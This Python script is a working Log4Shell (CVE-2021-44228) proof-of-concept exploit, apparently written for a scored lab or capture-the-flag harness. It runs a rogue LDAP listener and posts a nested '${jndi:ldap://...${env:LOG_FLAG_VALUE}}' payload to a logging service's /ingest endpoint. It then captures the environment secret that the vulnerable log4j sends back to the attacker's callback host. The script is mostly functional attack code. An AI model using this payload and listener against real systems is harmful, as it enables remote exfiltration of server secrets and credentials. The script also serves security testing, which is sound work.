#!/usr/bin/env python3
"""
PoC #3: Log4Shell — CVE-2021-44228 (REAL pinned-dependency CVE) -> secret theft
-------------------------------------------------------------------------------
On POST /ingest the untrusted message is written to the flight recorder through
a REAL log4j2 logger: `Store.append` calls `logger.info(message)`, backed by the
pinned, vulnerable `log4j-core` 2.14.1 (see ../build.sbt). That version has
message lookups enabled by default, so log4j — NOT our code — evaluates `${...}`
in attacker-controlled log content, including the JNDI lookup `${jndi:ldap://…}`
that is the actual Log4Shell trigger.

This is a genuine supply-chain CVE, parallel to IPM's pinned-ImageMagick
CVE-2022-44268: you can audit every line of the service source clean and still
ship it, because the bug lives in the dependency. The fix is a dependency bump
(log4j-core >= 2.17.1) and/or disabling message lookups — not a source edit.

Scoreable impact — this deployment's minted secret, exfiltrated:
  log4j evaluates *nested* lookups, so `${jndi:ldap://<us>/${env:LOG_FLAG_VALUE}}`
  makes log4j first substitute the per-deployment `LOG_FLAG_VALUE` (the minted
  flag generate-secrets.sh mints and entrypoint.sh materializes; see
  ../../generate-secrets.sh) into the LDAP URL, then dial our listener and ask
  it to resolve a DN literally named after the flag. We answer the anonymous
  BIND so the JDK proceeds to its searchRequest, whose baseObject IS the flag —
  we read it straight off the wire. `Store.append` only ever writes the raw,
  inert message to disk, so the flag never lands in searchable storage; the JNDI
  callback is the only channel that observes log4j's evaluation, and that is
  exactly what carries the secret out. The pass/fail below hinges on recovering
  the real `FLAG{...}` (and, when the harness exports LOG_FLAG_VALUE to this
  PoC's own env, on it matching that exact value), not merely on a callback.

The listener binds 0.0.0.0 and, by default, advertises our own IP as seen from
the route toward LOG (so no DNS is needed for LOG to reach us); override with the
CALLBACK_HOST env var if that address is not reachable.

Run LOG first, then:  python3 03_lookup_injection.py [host] [port]
"""
import json
import os
import re
import socket
import sys
import threading
import time
import urllib.request
import uuid

HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 8080
BASE = f"http://{HOST}:{PORT}"

# If the harness exports the deployment's minted flag into this PoC's own env
# (the poc service's `${LOG_FLAG_VALUE:-}` passthrough), assert the exfiltrated
# value equals it exactly; otherwise fall back to asserting the `FLAG{...}`
# shape of whatever real per-deployment value we recover off the wire.
EXPECTED_FLAG = os.environ.get("LOG_FLAG_VALUE", "")

# Minimal anonymous LDAP bindResponse (success), messageID 1 — this is what the
# JDK's LDAP client sends first; answering it is what makes the client go on to
# send the searchRequest whose baseObject is the DN we asked it to look up (the
# substituted flag). Without a bind reply the client never emits the DN.
LDAP_BIND_SUCCESS = bytes.fromhex("300c02010161070a010004000400")
FLAG_RE = re.compile(rb"FLAG\{[^}]{1,256}\}")


def _my_ip_towards(host, port):
    """Local IP the OS would use to reach LOG — reliable without DNS."""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect((host, port))
        return s.getsockname()[0]
    except Exception:
        return socket.gethostname()
    finally:
        s.close()


CALLBACK_HOST = os.environ.get("CALLBACK_HOST") or _my_ip_towards(HOST, PORT)

hits = []       # (peer_addr, all_bytes) for each inbound LDAP conversation


def ldap_listener():
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", 0))
    srv.listen(8)
    port = srv.getsockname()[1]

    def handle(conn, addr):
        blob = b""
        try:
            conn.settimeout(3)
            # Read the bindRequest, answer it so the JDK proceeds to the search.
            try:
                blob += conn.recv(1024)
                conn.sendall(LDAP_BIND_SUCCESS)
            except Exception:
                pass
            # The searchRequest carries the DN = the substituted flag. Drain
            # until the flag is in hand (or the peer/read times out).
            while not FLAG_RE.search(blob):
                more = conn.recv(1024)
                if not more:
                    break
                blob += more
        except Exception:
            pass
        finally:
            hits.append((addr, blob))
            conn.close()

    def loop():
        while True:
            try:
                conn, addr = srv.accept()
            except OSError:
                return
            threading.Thread(target=handle, args=(conn, addr), daemon=True).start()

    threading.Thread(target=loop, daemon=True).start()
    return port


def post_ingest(source, message):
    body = json.dumps({"source": source, "message": message}).encode()
    req = urllib.request.Request(f"{BASE}/ingest", data=body, method="POST")
    req.add_header("Content-Type", "application/json")
    with urllib.request.urlopen(req, timeout=30) as r:
        return r.status, r.read().decode(errors="replace")


def main():
    port = ldap_listener()
    token = uuid.uuid4().hex[:12]
    # Nested lookup: log4j resolves ${env:LOG_FLAG_VALUE} FIRST, then dials us
    # with the flag baked into the DN it asks us to resolve.
    target = f"ldap://{CALLBACK_HOST}:{port}/${{env:LOG_FLAG_VALUE}}"
    src = f"log4shell_{token}"
    payload = "boot sequence ${jndi:" + target + "} complete"

    print(f"[*] LDAP listener on 0.0.0.0:{port}")
    print(f"[*] Ingesting ${{jndi:ldap://{CALLBACK_HOST}:{port}/${{env:LOG_FLAG_VALUE}}}}")
    try:
        status, resp = post_ingest(src, payload)
        print(f"[*] /ingest -> {status} {resp[:160]}")
    except Exception as e:
        print(f"[*] /ingest raised (fine — the JNDI callback may still fire): {e}")

    deadline = time.time() + 12
    stolen = None
    while time.time() < deadline and stolen is None:
        for addr, blob in hits:
            m = FLAG_RE.search(blob)
            if m:
                stolen = (addr, m.group(0))
                break
        time.sleep(0.2)

    if stolen is None:
        if hits:
            addr, blob = hits[0]
            print(f"[-] Got a JNDI callback from {addr[0]}:{addr[1]} but no FLAG{{...}}")
            print(f"    was in the DN we captured: {blob[:96]!r}")
            print("    (log4j reached us, but the ${env:LOG_FLAG_VALUE} lookup came back")
            print("     empty — is LOG_FLAG_VALUE configured on the target?)")
        else:
            print("[-] No JNDI callback received. Check that LOG can reach CALLBACK_HOST")
            print("    (set CALLBACK_HOST to an address the log container can reach), and")
            print("    that log4j-core is still the vulnerable pinned 2.14.1.")
        return 1

    addr, flag = stolen
    flag = flag.decode()
    print(f"[+] Log4Shell confirmed (CVE-2021-44228): log4j 2.14.1 evaluated the")
    print(f"    nested lookup and called back from {addr[0]}:{addr[1]} with the flag")
    print(f"    baked into the LDAP DN it asked us to resolve.")

    if EXPECTED_FLAG:
        if flag == EXPECTED_FLAG:
            print(f"[+] SCORED: exfiltrated this deployment's real minted LOG_FLAG_VALUE")
            print(f"    via the JNDI callback and it matches the configured value: {flag!r}")
            return 0
        print(f"[-] Exfiltrated {flag!r} but expected {EXPECTED_FLAG!r} — value mismatch.")
        return 1

    print(f"[+] SCORED: exfiltrated this deployment's minted flag over the JNDI")
    print(f"    callback: {flag!r}")
    print("[*] (No LOG_FLAG_VALUE in this PoC's env to assert the exact value against;")
    print("     the recovered FLAG{...} is the live per-deployment secret regardless.)")
    return 0


if __name__ == "__main__":
    sys.exit(main())
